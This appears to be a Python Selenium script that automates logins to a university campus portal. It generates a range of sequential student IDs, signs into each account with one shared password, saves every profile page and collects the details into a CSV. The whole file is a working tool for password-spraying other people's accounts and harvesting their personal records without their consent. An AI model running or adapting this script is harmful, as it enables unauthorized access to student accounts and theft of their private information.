# author: Ritik Ranjan

from __future__ import annotations

import asyncio
import csv
import json
import time
import traceback
from typing import TYPE_CHECKING, Dict, List, Optional, Union

from bs4 import BeautifulSoup
from colorama import init, Fore
from selenium import webdriver
from selenium.webdriver.common.by import By

from utils.extracter import Extractor
from utils.transformer import ToAsync

try:
    import lxml  # type: ignore

    HTML_PARSER = "lxml"
except ImportError:
    HTML_PARSER = "html.parser"


if TYPE_CHECKING:
    from selenium.webdriver.remote.webdriver import WebDriver
    from selenium.webdriver.remote.webelement import WebElement

BASE_URL = "https://gu.icloudems.com/corecampus/index.php"

init(autoreset=True)

with open("config.json") as f:
    config: Dict[str, Union[str, List[str]]] = json.load(f)

PASSWORD: str = config["password".upper()]
HEADERS: List[str] = config["headers".upper()]
_BASE_ID: str = config["base".upper()]

LOWER_LIMIT: int = config["lower_limit".upper()]
UPPER_LIMIT: int = config["upper_limit".upper()]

if not (PASSWORD and _BASE_ID):
    raise ValueError("both password and base_id is required to run the program")

LIST_OF_IDS = [
    f"{_BASE_ID}{i:03}" for i in range(LOWER_LIMIT, UPPER_LIMIT + 1)
]


class Base:
    URL = BASE_URL

    username: str

    def __init__(
        self,
        *,
        driver: "WebDriver" = webdriver.Firefox(),
    ) -> None:
        self.driver = driver

        self.FILLED_CREDENTIALS = False
        self.LOGGED_IN = False
        self.ON_PROFILE = False

    def find_element(self, by: By, value: str) -> "WebElement":
        return self.driver.find_element(by, value)

    @ToAsync()
    def __internal_get_url(self, url: Optional[str] = None) -> None:
        self.driver.get(url or self.URL)

    @ToAsync()
    def _fill_credentials(
        self,
        *,
        username: str,
        password: Optional[str] = PASSWORD,
    ) -> None:
        # Filling username
        user_i_id = self.find_element(By.ID, "useriid")
        user_i_id.send_keys(username)

        # Filling password
        actual_password = self.find_element(By.ID, "actlpass")
        actual_password.send_keys(password)

        self.FILLED_CREDENTIALS = True
        self.username = username

    @ToAsync()
    def _click_login(
        self,
        button_name: Optional[str] = "psslogin",
    ) -> None:
        if not self.FILLED_CREDENTIALS:
            raise RuntimeError("Credentials not filled")

        login_btn = self.find_element(By.ID, button_name)
        login_btn.click()

        self.LOGGED_IN = True

    @ToAsync()
    def _click_profile(
        self,
        button_name: Optional[str] = "no-arrow",
    ) -> None:
        if not self.LOGGED_IN:
            raise RuntimeError("Not logged in")

        profile_btn = self.find_element(By.CLASS_NAME, button_name)
        profile_btn.click()

        main_profile_btn = self.find_element(By.CLASS_NAME, "d-flex")
        main_profile_btn.click()

        self.ON_PROFILE = True

    @ToAsync()
    def _save(
        self,
    ) -> str:
        if not self.ON_PROFILE:
            raise RuntimeError("Not on profile")

        file_name = f"{getattr(self, 'username', int(time.time()))}_profile.html"
        with open(rf"profiles/{file_name}", "w+") as f:
            print(f"{Fore.GREEN}SAVING PROFILE TO {file_name}")
            f.write(self.driver.page_source)

        name = self.get_name_of_student(self.driver.page_source)
        print(f"{Fore.GREEN}SAVED PROFILE FOR {name}")
        return file_name

    # @ToAsync()
    def get_name_of_student(self, page_source: str) -> str:
        soup = BeautifulSoup(page_source, HTML_PARSER)
        return soup.find("span", {"class": "d-none d-lg-inline-block mr-2"}).text

    def close_connection(self) -> None:
        print(f"{Fore.GREEN}CLOSING CONNECTION")
        self.driver.close()

    async def login(self, username: str) -> Extractor:
        print(f"{Fore.GREEN}LOGGING IN FOR {username}")
        await self.__internal_get_url()
        await self._fill_credentials(username=username)
        print(f"{Fore.GREEN}FILLED CREDENTIALS FOR {username}")
        await asyncio.sleep(0.5)
        await self._click_login()
        print(f"{Fore.GREEN}LOGGED IN FOR {username}")
        await asyncio.sleep(0.5)
        await self._click_profile()
        print(f"{Fore.GREEN}ON PROFILE FOR {username}")

        file_name = await self._save()
        print(f"{Fore.GREEN}SAVED PROFILE FOR {username}")
        return Extractor(file_name)

    async def main(self, list_of_username: List[str]) -> None:
        ls: List[List[str]] = []
        for username in list_of_username:
            try:
                ins = await self.login(username)
                if ins._values:
                    ls.append(ins._values)
            except Exception as e:
                print()
                print(f"{Fore.RED}ERROR OCCURED FOR {username}")
                print(f"{e[:100]} ...")

        with open("CSV.csv", "w") as csvfile:
            csvwriter = csv.writer(csvfile)
            csvwriter.writerow(HEADERS)
            csvwriter.writerows(ls)


async def runner() -> None:
    instance = Base()
    await instance.main(LIST_OF_IDS)


if __name__ == "__main__":
    asyncio.run(runner())
